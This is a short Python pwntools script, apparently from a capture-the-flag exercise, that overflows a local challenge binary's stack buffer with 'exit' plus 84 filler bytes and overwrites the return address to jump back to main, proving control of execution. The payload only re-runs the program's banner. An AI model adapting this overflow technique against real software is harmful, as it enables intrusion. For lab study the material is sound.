#!/usr/bin/env python3
import os
os.environ["TERM"]="xterm"
from pwn import *
context.binary=ELF("/work/waf/waf/chal",checksec=False)
context.log_level="error"

# Test 1: overflow with NUL-free filler, partial 3-byte return to main (0x4012a2) => should re-run
# banner ("Look ma...") proving control of RIP with no null issues.
def test(retbytes, extra=b""):
    p=process("/work/waf/waf/chal")
    p.recvuntil(b">> ")
    # must start with "exit" to pass strncmp and reach ret
    pay = b"exit" + b"A"*(88-4) + retbytes + extra
    p.send(pay)
    time.sleep(0.3)
    try:
        out=p.recv(timeout=1)
    except: out=b""
    p.close()
    return out

# ret to main (0x4012a2): send only 3 low bytes, rely on upper being zero
print("3-byte a2 12 40:", test(b"\xa2\x12\x40")[:60])
# full 8-byte ret to main
print("8-byte main    :", test(p64(0x4012a2))[:60])
# ret to the banner puts inside main start? try 0x40131c (loop head, prints Look ma? no, that's 0x4012a2 area)
